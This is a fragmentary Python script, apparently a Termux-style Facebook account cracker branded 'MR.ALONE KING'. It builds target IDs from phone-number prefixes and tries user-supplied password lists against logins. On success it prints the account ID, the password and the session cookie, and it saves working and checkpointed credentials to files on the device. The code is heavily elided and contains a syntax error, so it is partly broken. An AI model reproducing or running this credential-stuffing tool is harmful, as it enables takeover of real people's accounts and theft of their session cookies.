...
\033[0;93m
╔══════════════════════════════════════════╗🖤"
║Author   : 𝐌𝐑.ALONEـــــ👿👑KING
║YouTube   : 𝐌𝐑.ALONEـــــ👿👑KING
║Facebook : 𝐌𝐑.ALONEـــــ👿👑KING
║Version  : 4.0.1                       
╚══════════════════════════════════════════╝💔"\033[1;31m
    """) 
loop = 0
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}016,9374,9377,9378,9370,018,92302,92301,91778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    ...
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Bilal +)
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ALONE-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ALONE-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/ALONE-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ALONE{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
